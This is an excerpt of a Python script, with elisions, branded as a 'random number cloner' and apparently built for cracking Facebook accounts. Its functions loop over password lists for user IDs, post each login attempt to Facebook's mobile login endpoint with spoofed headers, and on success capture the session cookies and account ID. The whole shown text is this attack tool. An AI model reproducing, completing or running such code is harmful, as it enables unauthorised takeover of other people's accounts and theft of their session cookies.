...
logo=(f"""\x1b[1;97m
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : JULKAR NAYEN                                                                    │
    │ [✓] GITHUB   : JULKAR404-CYBER                                                             │
    │ [✓] WHATSAPP : +880132773968x                                                         │
    │ [✓] VERSION  : 0.5                                                                                                │
    │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?li=bno9ZGh8rdl6lhV3B6c1sVtV&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?li=kns9ZArYcaRpGIJNVhgNyR4-&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
    ...
    try:
        for ps in pwx:
            ...
            "scheme": 'https',
             ...
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?li=aXw9ZHAwMgLXSs5u7sgi0Q-E&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
